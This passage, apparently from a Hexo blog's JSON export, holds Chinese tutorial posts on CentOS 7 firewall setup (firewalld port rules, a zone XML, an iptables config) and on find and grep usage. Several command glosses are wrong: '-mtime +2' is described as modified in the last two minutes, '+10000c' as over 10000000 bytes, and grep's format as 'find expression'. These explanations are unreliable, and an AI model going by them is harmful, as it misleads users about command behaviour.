class=\"tag\">&lt;/<span class=\"name\">zone</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><code>上面的对应的规则</code></p>\n<p><code>固定IP 固定协议 的固定端口访问</code></p>\n<p><code>固定IP 固定协议 的范围端口访问</code></p>\n<p><code>固定IP 固定协议 的固定端口访问</code></p>\n<p><code>任意IP 固定协议 的固定端口访问切换为iptables防火墙</code></p>\n<p><code>关闭firewall：</code></p>\n<h4 id=\"安装iptables防火墙\"><a href=\"#安装iptables防火墙\" class=\"headerlink\" title=\"安装iptables防火墙\"></a>安装iptables防火墙</h4><h5 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h5><p><code>yum install iptables-services</code></p>\n<h5 id=\"开启iptables\"><a href=\"#开启iptables\" class=\"headerlink\" title=\"开启iptables\"></a>开启iptables</h5><p><code>service iptables restart</code></p>\n<h5 id=\"设置防火墙开机启动\"><a href=\"#设置防火墙开机启动\" class=\"headerlink\" title=\"设置防火墙开机启动\"></a>设置防火墙开机启动</h5><p><code>systemctl enable iptables.service  或者chkconfig iptables on</code></p>\n<h5 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h5><h5 id=\"查看已生效的规则\"><a href=\"#查看已生效的规则\" class=\"headerlink\" title=\"查看已生效的规则\"></a>查看已生效的规则</h5><p>iptables -L -n命令行方式</p>\n<p><code>iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 3306 -j ACCEPT</code></p>\n<h5 id=\"写入配置文件\"><a href=\"#写入配置文件\" class=\"headerlink\" title=\"写入配置文件\"></a>写入配置文件</h5><p><code>service iptables save</code></p>\n<p>这样下次重启依旧会生效配置文件方式</p>\n<h5 id=\"编辑iptables防火墙配置\"><a href=\"#编辑iptables防火墙配置\" class=\"headerlink\" title=\"编辑iptables防火墙配置\"></a>编辑iptables防火墙配置</h5><p>vi /etc/sysconfig/iptables</p>\n<p>下边是一个完整的配置文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Firewall configuration written by system-config-firewall</span><br><span class=\"line\"></span><br><span class=\"line\">Manual customization of this file is not recommended.</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">*filter</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">:INPUT ACCEPT [0:0]:FORWARD ACCEPT [0:0]:OUTPUT ACCEPT [0:0]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">-A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT</span><br><span class=\"line\"></span><br><span class=\"line\">-A INPUT -p icmp -j ACCEPT</span><br><span class=\"line\"></span><br><span class=\"line\">-A INPUT -i lo -j ACCEPT</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">-A INPUT -m state --state NEW -m tcp -p tcp --dport 22 -j ACCEPT</span><br><span class=\"line\"></span><br><span class=\"line\">-A INPUT -m state --state NEW -m tcp -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\"></span><br><span class=\"line\">-A INPUT -m state --state NEW -m tcp -p tcp --dport 3306 -j ACCEPT</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">-A INPUT -j REJECT --reject-with icmp-host-prohibited</span><br><span class=\"line\"></span><br><span class=\"line\">-A FORWARD -j REJECT --reject-with icmp-host-prohibited</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">COMMIT</span><br></pre></td></tr></table></figure>\n\n<p>保存退出</p>\n<p>:wq!</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"CentOS7-防火墙设置\"><a href=\"#CentOS7-防火墙设置\" class=\"headerlink\" title=\"CentOS7 防火墙设置\"></a>CentOS7 防火墙设置</h2><p>阿里云centos7中默认使用firewall,并且默认没有开启。</p>\n<p>使用阿里云服务器,先要在阿里云后台开放端口,然后关闭centos防火墙或者开放centos的对应端口,只开放centos端口,不设置阿里云端口设置,仍然不能访问!firewall配置</p>\n<h4 id=\"重启、关闭、开启firewalld服务\"><a href=\"#重启、关闭、开启firewalld服务\" class=\"headerlink\" title=\"重启、关闭、开启firewalld服务\"></a>重启、关闭、开启firewalld服务</h4><h5 id=\"启动\"><a href=\"#启动\" class=\"headerlink\" title=\"启动\"></a>启动</h5><p>systemctl start firewalld</p>\n<h5 id=\"开机启动\"><a href=\"#开机启动\" class=\"headerlink\" title=\"开机启动\"></a>开机启动</h5><p>systemctl enable firewalld</p>\n<h5 id=\"关闭\"><a href=\"#关闭\" class=\"headerlink\" title=\"关闭\"></a>关闭</h5><p>systemctl stop firewalld</p>\n<h5 id=\"取消开机启动\"><a href=\"#取消开机启动\" class=\"headerlink\" title=\"取消开机启动\"></a>取消开机启动</h5><p>systemctl disable firewalld</p>\n<h5 id=\"重启\"><a href=\"#重启\" class=\"headerlink\" title=\"重启\"></a>重启</h5><p>service firewalld restart</p>\n<h5 id=\"查看firewall的状态\"><a href=\"#查看firewall的状态\" class=\"headerlink\" title=\"查看firewall的状态\"></a>查看firewall的状态</h5><p>firewall-cmd –state</p>\n<h5 id=\"查看防火墙规则\"><a href=\"#查看防火墙规则\" class=\"headerlink\" title=\"查看防火墙规则\"></a>查看防火墙规则</h5><p>firewall-cmd –list-all</p>\n<h5 id=\"用户配置目录\"><a href=\"#用户配置目录\" class=\"headerlink\" title=\"用户配置目录\"></a>用户配置目录</h5><p>cd /etc/firewalld/命令行方式</p>\n<h5 id=\"常用的几个端口和配置语句\"><a href=\"#常用的几个端口和配置语句\" class=\"headerlink\" title=\"常用的几个端口和配置语句\"></a>常用的几个端口和配置语句</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">**<span class=\"comment\"># web**</span></span><br><span class=\"line\"></span><br><span class=\"line\">firewall-cmd --zone=public --permanent --add-port=80/tcp</span><br><span class=\"line\"></span><br><span class=\"line\">**<span class=\"comment\"># mysql**</span></span><br><span class=\"line\"></span><br><span class=\"line\">firewall-cmd --zone=public --permanent --add-port=3306/tcp</span><br><span class=\"line\"></span><br><span class=\"line\">**<span class=\"comment\"># tomcat**</span></span><br><span class=\"line\"></span><br><span class=\"line\">firewall-cmd --zone=public --permanent --add-port=8080/tcp</span><br><span class=\"line\"></span><br><span class=\"line\">**<span class=\"comment\"># redis**</span></span><br><span class=\"line\"></span><br><span class=\"line\">firewall-cmd --zone=public --permanent --add-port=6379/tcp</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">firewall-cmd：是Linux提供的操作firewall的一个工具； –permanent：表示设置为持久； –add-port：标识添加的端口； –zone=public：指定的zone为public；</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"批量添加端口\"><a href=\"#批量添加端口\" class=\"headerlink\" title=\"批量添加端口\"></a>批量添加端口</h5><p>firewall-cmd –zone=public –permanent –add-port=8081-8200/tcp</p>\n<h5 id=\"生成的配置文件所在路径\"><a href=\"#生成的配置文件所在路径\" class=\"headerlink\" title=\"生成的配置文件所在路径\"></a>生成的配置文件所在路径</h5><p>vi /etc/firewalld/zones/public.xml</p>\n<h5 id=\"配置完成后重启\"><a href=\"#配置完成后重启\" class=\"headerlink\" title=\"配置完成后重启\"></a>配置完成后重启</h5><p>service firewalld restart配置文件方式</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><span class=\"tag\">&lt;<span class=\"name\">zone</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">short</span>&gt;</span>Public<span class=\"tag\">&lt;/<span class=\"name\">short</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">description</span>&gt;</span>For use in public areas.<span class=\"tag\">&lt;/<span class=\"name\">description</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">rule</span> <span class=\"attr\">family</span>=<span class=\"string\">&quot;ipv4&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">source</span> <span class=\"attr\">address</span>=<span class=\"string\">&quot;122.10.70.234&quot;</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">port</span> <span class=\"attr\">protocol</span>=<span class=\"string\">&quot;udp&quot;</span> <span class=\"attr\">port</span>=<span class=\"string\">&quot;514&quot;</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">accept</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">rule</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">rule</span> <span class=\"attr\">family</span>=<span class=\"string\">&quot;ipv4&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">source</span> <span class=\"attr\">address</span>=<span class=\"string\">&quot;123.60.255.14&quot;</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">port</span> <span class=\"attr\">protocol</span>=<span class=\"string\">&quot;tcp&quot;</span> <span class=\"attr\">port</span>=<span class=\"string\">&quot;10050-10051&quot;</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">accept</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">rule</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">rule</span> <span class=\"attr\">family</span>=<span class=\"string\">&quot;ipv4&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">source</span> <span class=\"attr\">address</span>=<span class=\"string\">&quot;192.249.87.114&quot;</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">port</span> <span class=\"attr\">protocol</span>=<span class=\"string\">&quot;tcp&quot;</span> <span class=\"attr\">port</span>=<span class=\"string\">&quot;80&quot;</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">accept</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">rule</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">rule</span> <span class=\"attr\">family</span>=<span class=\"string\">&quot;ipv4&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">port</span> <span class=\"attr\">protocol</span>=<span class=\"string\">&quot;tcp&quot;</span> <span class=\"attr\">port</span>=<span class=\"string\">&quot;9527&quot;</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">accept</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">rule</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">zone</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><code>上面的对应的规则</code></p>\n<p><code>固定IP 固定协议 的固定端口访问</code></p>\n<p><code>固定IP 固定协议 的范围端口访问</code></p>\n<p><code>固定IP 固定协议 的固定端口访问</code></p>\n<p><code>任意IP 固定协议 的固定端口访问切换为iptables防火墙</code></p>\n<p><code>关闭firewall：</code></p>\n<h4 id=\"安装iptables防火墙\"><a href=\"#安装iptables防火墙\" class=\"headerlink\" title=\"安装iptables防火墙\"></a>安装iptables防火墙</h4><h5 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h5><p><code>yum install iptables-services</code></p>\n<h5 id=\"开启iptables\"><a href=\"#开启iptables\" class=\"headerlink\" title=\"开启iptables\"></a>开启iptables</h5><p><code>service iptables restart</code></p>\n<h5 id=\"设置防火墙开机启动\"><a href=\"#设置防火墙开机启动\" class=\"headerlink\" title=\"设置防火墙开机启动\"></a>设置防火墙开机启动</h5><p><code>systemctl enable iptables.service  或者chkconfig iptables on</code></p>\n<h5 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h5><h5 id=\"查看已生效的规则\"><a href=\"#查看已生效的规则\" class=\"headerlink\" title=\"查看已生效的规则\"></a>查看已生效的规则</h5><p>iptables -L -n命令行方式</p>\n<p><code>iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 3306 -j ACCEPT</code></p>\n<h5 id=\"写入配置文件\"><a href=\"#写入配置文件\" class=\"headerlink\" title=\"写入配置文件\"></a>写入配置文件</h5><p><code>service iptables save</code></p>\n<p>这样下次重启依旧会生效配置文件方式</p>\n<h5 id=\"编辑iptables防火墙配置\"><a href=\"#编辑iptables防火墙配置\" class=\"headerlink\" title=\"编辑iptables防火墙配置\"></a>编辑iptables防火墙配置</h5><p>vi /etc/sysconfig/iptables</p>\n<p>下边是一个完整的配置文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Firewall configuration written by system-config-firewall</span><br><span class=\"line\"></span><br><span class=\"line\">Manual customization of this file is not recommended.</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">*filter</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">:INPUT ACCEPT [0:0]:FORWARD ACCEPT [0:0]:OUTPUT ACCEPT [0:0]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">-A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT</span><br><span class=\"line\"></span><br><span class=\"line\">-A INPUT -p icmp -j ACCEPT</span><br><span class=\"line\"></span><br><span class=\"line\">-A INPUT -i lo -j ACCEPT</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">-A INPUT -m state --state NEW -m tcp -p tcp --dport 22 -j ACCEPT</span><br><span class=\"line\"></span><br><span class=\"line\">-A INPUT -m state --state NEW -m tcp -p tcp --dport 80 -j ACCEPT</span><br><span class=\"line\"></span><br><span class=\"line\">-A INPUT -m state --state NEW -m tcp -p tcp --dport 3306 -j ACCEPT</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">-A INPUT -j REJECT --reject-with icmp-host-prohibited</span><br><span class=\"line\"></span><br><span class=\"line\">-A FORWARD -j REJECT --reject-with icmp-host-prohibited</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">COMMIT</span><br></pre></td></tr></table></figure>\n\n<p>保存退出</p>\n<p>:wq!</p>\n"},{"title":"find&grep","date":"2021-01-13T10:20:25.000Z","_content":"\n## find 和 grep命令\n\n在使用linux时，经常需要进行文件查找。其中查找的命令主要有find和grep。两个命令是有区的。\n\n　　区别：\n\n- find命令是根据文件的属性进行查找，如文件名，文件大小，所有者，所属组，是否为空，访问时间，修改时间等。 \n\n- grep是根据文件的内容进行查找，会对文件的每一行按照给定的模式(patter)进行匹配查找。\n\n### 　　find命令\n\n#### 　　　　基本格式\n\n​\t\t\t\t\t   find  path expression\n\n##### 　　　　1.按照文件名查找\n\n\n\n　　　　(1)find / -name httpd.conf　　#在根目录下查找文件httpd.conf，表示在整个硬盘查找\n\n　　　　(2)find /etc -name httpd.conf　　#在/etc目录下文件httpd.conf\n\n　　　　(3)find /etc -name '*srm*'　　#使用通配符*(0或者任意多个)。表示在/etc目录下查找文件名中含有字符串‘srm’的文件\n\n　　　　(4)find . -name 'srm*' 　　#表示当前目录下查找文件名开头是字符串‘srm’的文件\n\n##### 　　　　2.按照文件特征查找 　　　　\n\n\n\n　　　　(1)find / -amin -10 　　# 查找在系统中最后10分钟访问的文件(access time)\n\n　　　　(2)find / -atime -2　　 # 查找在系统中最后48小时访问的文件\n\n　　　　(3)find / -empty 　　# 查找在系统中为空的文件或者文件夹\n\n　　　　(4)find / -group cat 　　# 查找在系统中属于 group为cat的文件\n\n　　　　(5)find / -mmin -5 　　# 查找在系统中最后5分钟里修改过的文件(modify time)\n\n　　　　(6)find / -mtime -1 　　#查找在系统中最后24小时里修改过的文件\n\n　　　　(7)find / -user fred 　　#查找在系统中属于fred这个用户的文件\n\n　　　　(8)find / -size +10000c　　#查找出大于10000000字节的文件(c:字节，w:双字，k:KB，M:MB，G:GB)\n\n　　　　(9)find / -size -1000k 　　#查找出小于1000KB的文件\n\n##### 　　　　3.使用混合查找方式查找文件\n\n　　　　参数有： ！，-and(-a)，-or(-o)。\n\n\n\n　　 (1)find /tmp -size +10000c -and -mtime +2    #在/tmp目录下查找大于10000字节并在最后2分钟内修改的文件\n\n  　   (2)find / -user fred -or -user george 　　#在/目录下查找用户是fred或者george的文件文件\n\n  　   (3)find /tmp ! -user panda　　#在/tmp目录中查找所有不属于panda用户的文件\n\n### 　　grep命令\n\n　　　  基本格式：find  expression\n\n#####  　　 1.主要参数\n\n\n\n　　　　[options]主要参数：\n\n　　　　－c：只输出匹配行的计数。\n\n　　　　－i：不区分大小写\n\n　　　　－h：查询多文件时不显示文件名。\n\n　　　　－l：查询多文件时只输出包含匹配字符的文件名。\n\n　　　　－n：显示匹配行及行号。\n\n　　　　－s：不显示不存在或无匹配文本的错误信息。\n\n　　　　－v：显示不包含匹配文本的所有行。\n\n\n\n　　　　pattern正则表达式主要参数：\n\n　　　　\\： 忽略正则表达式中特殊字符的原有含义。\n\n　　　　^：匹配正则表达式的开始行。\n\n　　　　$: 匹配正则表达式的结束行。\n\n　　　　\\<：从匹配正则表达 式的行开始。\n\n　　　　\\>：到匹配正则表达式的行结束。\n\n　　　　[ ]：单个字符，如[A]即A符合要求 。\n\n　　　　[ - ]：范围，如[A-Z]，即A、B、C一直到Z都符合要求 。\n\n　　　　.：所有的单个字符。\n\n　　　　* ：有字符，长度可以为0。\n\n##### 　　　　2.实例　 \n\n\n\n　　(1)grep 'test' d*　　#显示所有以d开头的文件中包含 test的行\n\n　　(2)grep ‘test’ aa bb cc 　　 #显示在aa，bb，cc文件中包含test的行\n\n　　(3)grep ‘[a-z]\\{5\\}’ aa 　　#显示所有包含每行字符串至少有5个连续小写字符的字符串的行\n\n　　(4)grep magic /usr/src　　#显示/usr/src目录下的文件(不含子目录)包含magic的行\n\n　　(5)grep -r magic /usr/src　　#显示/usr/src目录下的文件(包含子目录)包含magic的行\n\n　　(6)grep -w pattern files ：只匹配整个单词，而不是字符串的一部分(如匹配’magic’，而不是’magical’)，\n","source":"_posts/find&grep.md","raw":"---\ntitle: find&grep\ndate: 2021-01-13 18:20:25\ntags:\n      - linux\n      - bash\n      - find\ncategories: linux\n---\n\n## find 和 grep命令\n\n在使用linux时，经常需要进行文件查找。其中查找的命令主要有find和grep。两个命令是有区的。\n\n　　区别：\n\n- find命令是根据文件的属性进行查找，如文件名，文件大小，所有者，所属组，是否为空，访问时间，修改时间等。 \n\n- grep是根据文件的内容进行查找，会对文件的每一行按照给定的模式(patter)进行匹配查找。\n\n### 　　find命令\n\n#### 　　　　基本格式\n\n​\t\t\t\t\t   find  path expression\n\n##### 　　　　1.按照文件名查找\n\n\n\n　　　　(1)find / -name httpd.conf　　#在根目录下查找文件httpd.conf，表示在整个硬盘查找\n\n　　　　(2)find /etc -name httpd.conf　　#在/etc目录下文件httpd.conf\n\n　　　　(3)find /etc -name '*srm*'　　#使用通配符*(0或者任意多个)。表示在/etc目录下查找文件名中含有字符串‘srm’的文件\n\n　　　　(4)find . -name 'srm*' 　　#表示当前目录下查找文件名开头是字符串‘srm’的文件\n\n##### 　　　　2.按照文件特征查找 　　　　\n\n\n\n　　　　(1)find / -amin -10 　　# 查找在系统中最后10分钟访问的文件(access time)\n\n　　　　(2)find / -atime -2　　 # 查找在系统中最后48小时访问的文件\n\n　　　　(3)find / -empty 　　# 查找在系统中为空的文件或者文件夹\n\n　　　　(4)find / -group cat 　　# 查找在系统中属于 group为cat的文件\n\n　　　　(5)find / -mmin -5 　　# 查找在系统中最后5分钟里修改过的文件(modify time)\n\n　　　　(6)find / -mtime -1 　　#查找在系统中最后24小时里修改过的文件\n\n　　　　(7)find / -user fred 　　#查找在系统中属于fred这个用户的文件\n\n　　　　(8)find / -size +10000c　　#查找出大于10000000字节的文件(c:字节，w:双字，k:KB，M:MB，G:GB)\n\n　　　　(9)find / -size -1000k 　　#查找出小于1000KB的文件\n\n##### 　　　　3.使用混合查找方式查找文件\n\n　　　　参数有： ！，-and(-a)，-or(-o)。\n\n\n\n　　 (1)find /tmp -size +10000c -and -mtime +2    #在/tmp目录下查找大于10000字节并在最后2分钟内修改的文件\n\n  　   (2)find / -user fred -or -user george 　　#在/目录下查找用户是fred或者george的文件文件\n\n  　   (3)find /tmp ! -user panda　　#在/tmp目录中查找所有不属于panda用户的文件\n\n### 　　grep命令\n\n　　　  基本格式：find  expression\n\n#####  　　 1.主要参数\n\n\n\n　　　　[options]主要参数：\n\n　　　　－c：只输出匹配行的计数。\n\n　　　　－i：不区分大小写\n\n　　　　－h：查询多文件时不显示文件名。\n\n　　　　－l：查询多文件时只输出包含匹配字符的文件名。\n\n　　　　－n：显示匹配行及行号。\n\n　　　　－s：不显示不存在或无匹配文本的错误信息。\n\n　　　　－v：显示不包含匹配文本的所有行。\n\n\n\n　　　　pattern正则表达式主要参数：\n\n　　　　\\： 忽略正则表达式中特殊字符的原有含义。\n\n　　　　^：匹配正则表达式的开始行。\n\n　　　　$: 匹配正则表达式的结束行。\n\n　　　　\\<：从匹配正则表达 式的行开始。\n\n　　　　\\>：到匹配正则表达式的行结束。\n\n　　　　[ ]：单个字符，如[A]即A符合要求 。\n\n　　　　[ - ]：范围，如[A-Z]，即A、B、C一直到Z都符合要求 。\n\n　　　　.：所有的单个字符。\n\n　　　　* ：有字符，长度可以为0。\n\n##### 　　　　2.实例　 \n\n\n\n　　(1)grep 'test' d*　　#显示所有以d开头的文件中包含 test的行\n\n　　(2)grep ‘test’ aa bb cc 　　 #显示在aa，bb，cc文件中包含test的行\n\n　　(3)grep ‘[a-z]\\{5\\}’ aa 　　#显示所有包含每行字符串至少有5个连续小写字符的字符串的行\n\n　　(4)grep magic /usr/src　　#显示/usr/src目录下的文件(不含子目录)包含magic的行\n\n　　(5)grep -r magic /usr/src　　#显示/usr/src目录下的文件(包含子目录)包含magic的行\n\n　　(6)grep -w pattern files ：只匹配整个单词，而不是字符串的一部分(如匹配’magic’，而不是’magical’)，\n","slug":"find&grep","published":1,"updated":"2022-01-13T10:23:35.099Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckyiip9m1000bgsw96tdc1wn8","content":"<h2 id=\"find-和-grep命令\"><a href=\"#find-和-grep命令\" class=\"headerlink\" title=\"find 和 grep命令\"></a>find 和 grep命令</h2><p>在使用linux时，经常需要进行文件查找。其中查找的命令主要有find和grep。两个命令是有区的。</p>\n<p>　　区别：</p>\n<ul>\n<li><p>find命令是根据文件的属性进行查找，如文件名，文件大小，所有者，所属组，是否为空，访问时间，修改时间等。 </p>\n</li>\n<li><p>grep是根据文件的内容进行查找，会对文件的每一行按照给定的模式(patter)进行匹配查找。</p>\n</li>\n</ul>\n<h3 id=\"find命令\"><a href=\"#find命令\" class=\"headerlink\" title=\"find命令\"></a>find命令</h3><h4 id=\"基本格式\"><a href=\"#基本格式\" class=\"headerlink\" title=\"基本格式\"></a>基本格式</h4><p>​                       find  path expression</p>\n<h5 id=\"1-按照文件名查找\"><a href=\"#1-按照文件名查找\" class=\"headerlink\" title=\"1.按照文件名查找\"></a>1.按照文件名查找</h5><p>　　　　(1)find / -name httpd.conf　　#在根目录下查找文件httpd.conf，表示在整个硬盘查找</p>\n<p>　　　　(2)find /etc -name httpd.conf　　#在/etc目录下文件httpd.conf</p>\n<p>　　　　(3)find /etc -name ‘<em>srm</em>‘　　#使用通配符*(0或者任意多个)。表示在/etc目录下查找文件名中含有字符串‘srm’的文件</p>\n<p>　　　　(4)find . -name ‘srm*’ 　　#表示当前目录下查找文件名开头是字符串‘srm’的文件</p>\n<h5 id=\"2-按照文件特征查找\"><a href=\"#2-按照文件特征查找\" class=\"headerlink\" title=\"2.按照文件特征查找\"></a>2.按照文件特征查找</h5><p>　　　　(1)find / -amin -10 　　# 查找在系统中最后10分钟访问的文件(access time)</p>\n<p>　　　　(2)find / -atime -2　　 # 查找在系统中最后48小时访问的文件</p>\n<p>　　　　(3)find / -empty 　　# 查找在系统中为空的文件或者文件夹</p>\n<p>　　　　(4)find / -group cat 　　# 查找在系统中属于 group为cat的文件</p>\n<p>　　　　(5)find / -mmin -5 　　# 查找在系统中最后5分钟里修改过的文件(modify time)</p>\n<p>　　　　(6)find / -mtime -1 　　#查找在系统中最后24小时里修改过的文件</p>\n<p>　　　　(7)find / -user fred 　　#查找在系统中属于fred这个用户的文件</p>\n<p>　　　　(8)find / -size +10000c　　#查找出大于10000000字节的文件(c:字节，w:双字，k:KB，M:MB，G:GB)</p>\n<p>　　　　(9)find / -size -1000k 　　#查找出小于1000KB的文件</p>\n<h5 id=\"3-使用混合查找方式查找文件\"><a href=\"#3-使用混合查找方式查找文件\" class=\"headerlink\" title=\"3.使用混合查找方式查找文件\"></a>3.使用混合查找方式查找文件</h5><p>　　　　参数有： ！，-and(-a)，-or(-o)。</p>\n<p>　　 (1)find /tmp -size +10000c -and -mtime +2    #在/tmp目录下查找大于10000字节并在最后2分钟内修改的文件</p>\n<p>  　   (2)find / -user fred -or -user george 　　#在/目录下查找用户是fred或者george的文件文件</p>\n<p>  　   (3)find /tmp ! -user panda　　#在/tmp目录中查找所有不属于panda用户的文件</p>\n<h3 id=\"grep命令\"><a href=\"#grep命令\" class=\"headerlink\" title=\"grep命令\"></a>grep命令</h3><p>　　　  基本格式：find  expression</p>\n<h5 id=\"1-主要参数\"><a href=\"#1-主要参数\" class=\"headerlink\" title=\"1.主要参数\"></a>1.主要参数</h5><p>　　　　[options]主要参数：</p>\n<p>　　　　－c：只输出匹配行的计数。</p>\n<p>　　　　－i：不区分大小写</p>\n<p>　　　　－h：查询多文件时不显示文件名。</p>\n<p>　　　　－l：查询多文件时只输出包含匹配字符的文件名。</p>\n<p>　　　　－n：显示匹配行及行号。</p>\n<p>　　　　－s：不显示不存在或无匹配文本的错误信息。</p>\n<p>　　　　－v：显示不包含匹配文本的所有行。</p>\n<p>　　　　pattern正则表达式主要参数：</p>\n<p>　　　　\\： 忽略正则表达式中特殊字符的原有含义。</p>\n<p>　　　　^：匹配正则表达式的开始行。</p>\n<p>　　　　$: 匹配正则表达式的结束行。</p>\n<p>　　　　&lt;：从匹配正则表达 式的行开始。</p>\n<p>　　　　&gt;：到匹配正则表达式的行结束。</p>\n<p>　　　　[ ]：单个字符，如[A]即A符合要求 。</p>\n<p>　　　　[ - 